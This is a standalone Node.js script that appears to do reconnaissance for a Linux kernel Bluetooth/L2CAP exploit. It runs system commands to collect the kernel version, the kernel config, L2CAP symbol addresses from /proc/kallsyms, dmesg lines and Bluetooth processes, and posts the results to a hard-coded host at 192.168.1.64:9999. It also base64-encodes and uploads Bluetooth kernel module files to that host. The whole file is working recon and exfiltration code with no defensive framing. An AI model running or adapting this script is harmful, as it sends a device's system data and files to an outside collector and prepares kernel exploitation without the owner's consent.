"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body, cb) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); if (cb) cb(null); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); if (cb) cb(e); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 10000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.version = sh("uname -a; echo ===; cat /proc/version; echo ===; ls /usr/lib/modules/");
out.bt_find = sh("find /usr/lib/modules /usr/lib /lib -iname '*bluetooth*' -o -iname '*l2cap*' -o -iname '*bnep*' -o -iname '*hci_uart*' 2>/dev/null | head -25");
out.kallsyms = sh("grep -iE 'l2cap_parse_conf|l2cap_config_req|l2cap_recv|hci_rx' /proc/kallsyms | head -25");
out.config = sh("gunzip -c /proc/config.gz 2>/dev/null | grep -iE 'BLUE|L2CAP|BT_' | head -30; echo ===; ls -la /proc/config.gz 2>&1");
out.dmesg_bt = sh("dmesg 2>/dev/null | grep -iE 'bluetooth|l2cap|hci|bt ' | head -15");
out.mods = sh("cat /proc/modules | grep -iE 'bt|blue|l2cap' ; echo ===; find /usr/lib/modules/4.1.10 -name '*.ko' 2>/dev/null | head -30");
out.psbt = sh("ps -A | grep -iE 'bt|blue'");
post("/blue1", out);

var pull = {};
pull.started = out.started;
var found = out.bt_find.split("\n");
var got = [];
for (var i = 0; i < found.length && got.length < 6; i++) {
    var p = found[i].trim();
    if (!/\.ko$/.test(p) && !/l2cap/.test(p)) continue;
    try {
        var st = fs.statSync(p);
        if (st.size > 3000000) continue;
        var buf = fs.readFileSync(p);
        got.push({ path: p, size: st.size, b64: buf.toString("base64") });
    } catch (e) {}
}
pull.files = got;
post("/blue2", pull);
post("/blue_done", { started: out.started });
